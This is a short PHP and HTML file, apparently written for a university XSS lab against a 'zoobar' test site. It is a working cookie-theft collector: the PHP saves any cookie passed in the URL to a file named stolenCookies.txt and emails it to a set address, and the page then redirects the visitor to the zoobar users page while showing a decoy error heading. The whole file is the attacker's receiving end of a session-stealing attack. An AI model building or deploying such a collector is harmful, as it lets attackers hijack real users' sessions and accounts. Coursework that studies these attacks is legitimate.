<?php

  $from = "zoobar@dasak.csc.kth.se";
  $to = "ipyluk@kth.se";
  $subject = "labW";

if (isset($_GET['cookie']))
{
	$file = 'stolenCookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
	$message = $_GET['cookie'];
	$headers = "From: " . $from;
	mail($to, $subject, $message, $headers, "-f " . $from);
}

?>
<!DOCTYPE html>
<html>
<head>
	<title> XSS Tutorial #4 - Problem </title>
	<script type="text/javascript">
		location.href="http://dasak.csc.kth.se/zoobar/users.php";
	</script>
</head>
<body>
<h1 align="center"> Oh No! Something went wrong! </h1>
</body>
</html> 